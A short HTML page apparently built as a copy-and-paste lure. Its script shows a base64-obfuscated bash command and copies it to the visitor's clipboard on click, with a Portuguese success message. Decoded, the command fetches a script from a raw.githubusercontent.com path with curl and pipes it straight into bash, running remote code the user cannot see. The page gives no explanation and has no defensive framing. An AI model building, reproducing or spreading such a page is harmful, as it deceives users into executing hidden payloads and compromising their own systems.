<!doctype html>
<html>
<body>
<script>
(() => {
  const command = `bash -c "$(echo 'Y3VybCAtZnNTTCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1IyRmljbWxsYkNCQmRXZDFjM1J2SUdSdmN5QlRZVzUwYjNNNFAvMC9yZWZzL2hlYWRzL21haW4vYmFzZSIgfCBiYXNo' | base64 -d)"`;

  const c = document.createElement('div');
  c.textContent = command;
  c.style.cssText = `
    padding:20px;
    background:#111;
    color:#fff;
    font-family:monospace;
    cursor:pointer;
    word-break:break-all;
  `;

  document.body.appendChild(c);

  c.onclick = async () => {
    await navigator.clipboard.writeText(command);
    c.textContent = 'Copiado com sucesso!';
    setTimeout(() => c.textContent = command, 1500);
  };
})();
</script>
</body>
</html>
